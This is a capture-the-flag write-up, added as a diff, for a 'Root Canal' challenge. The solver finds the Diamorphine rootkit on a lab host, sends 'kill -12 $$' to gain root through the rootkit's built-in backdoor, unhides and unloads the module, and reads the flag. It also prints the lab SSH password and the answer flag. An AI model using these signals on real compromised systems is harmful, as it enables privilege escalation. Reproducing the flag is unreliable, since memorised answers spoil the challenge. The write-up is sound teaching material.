@@ -1,0 +1,69 @@
+Challenge: Root Canal
+Category: Miscellaneous
+Autor: Matt Kiely (HuskyHacks)
+
+Description:
+
+But what is the real root of the issue?
+
+If you are using the VPN, you can SSH in to this challenge with:
+
+Username: ctf
+Password: HuntressCTF2025
+
+Solve:
+
+1. I connected to the challenge interface and found [README.txt] file in the home directory
+
+ctf@ip-10-1-88-23:~$ cat README.txt 
+Once you fix your root your root canal, you'll see a new directory here!
+Do some reconnaissance and you'll find the real root of the issue :)
+
+2. During basic recon I found the directory [/opt/.diamorphine] which means the Diamorphine rootkit is likely loaded: https://github.com/m0nad/Diamorphine
+
+ctf@ip-10-1-88-23:~$ ls -lahi /opt
+total 12K
+  3877 drwxr-xr-x  3 root root 4.0K Sep 26 14:12 .
+     2 drwxr-xr-x 22 root root 4.0K Nov  1 13:53 ..
+258161 drwxr-xr-x  2 root root 4.0K Sep 26 15:02 .diamorphine
+
+3. Reviewing some documentation and given the challenge context, we need to remoe the rootkit by sending a signal, and then "rmmod diamorphine"
+
+	3a. https://isec.ne.jp/wp-content/uploads/2017/11/74LKM-rootkits-1.pdf
+	3b. I performed some signal "fuzzing" and send various signals until I found one that gave me root, and then explored from there.
+
+4. Sending signal "12" we can elevate to root
+
+ctf@ip-10-1-88-23:~$ whoami
+ctf
+ctf@ip-10-1-88-23:~$ kill -12 $$
+ctf@ip-10-1-88-23:~$ whoami
+root
+
+5. Sending signal "11" we can kill the "diamorphine" process and then uninstall the module
+
+ctf@ip-10-1-88-23:~$ kill -11 $$
+ctf@ip-10-1-88-23:~$ rmmod diamorphine
+
+6. Finally we can see the hidden directory the [README.txt] alluded to
+
+ctf@ip-10-1-88-23:~$ ls -lah
+total 44K
+drwxr-xr-x 6 ctf  ctf  4.0K Sep 26 14:19 .
+drwxr-xr-x 4 root root 4.0K Sep 26 14:09 ..
+-rw------- 1 ctf  ctf    53 Sep 26 14:19 .bash_history
+-rw-r--r-- 1 ctf  ctf   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 ctf  ctf  3.7K Apr  4  2018 .bashrc
+drwx------ 2 ctf  ctf  4.0K Sep 26 14:14 .cache
+drwx------ 3 ctf  ctf  4.0K Sep 26 14:14 .gnupg
+-rw-r--r-- 1 ctf  ctf   807 Apr  4  2018 .profile
+-rw-r--r-- 1 ctf  ctf   142 Sep 26 14:12 README.txt
+d--------- 2 root root 4.0K Sep 26 14:12 squiblydoo <-- new
+drwx------ 2 ctf  ctf  4.0K Sep 26 14:09 .ssh
+
+7. We can now cat the flag
+
+ctf@ip-10-1-88-23:~$ cat squiblydoo/flag.txt
+flag{ce56efc41f0c7b45a7e32ec7117cf8b9}
+
+Flag: flag{ce56efc41f0c7b45a7e32ec7117cf8b9}
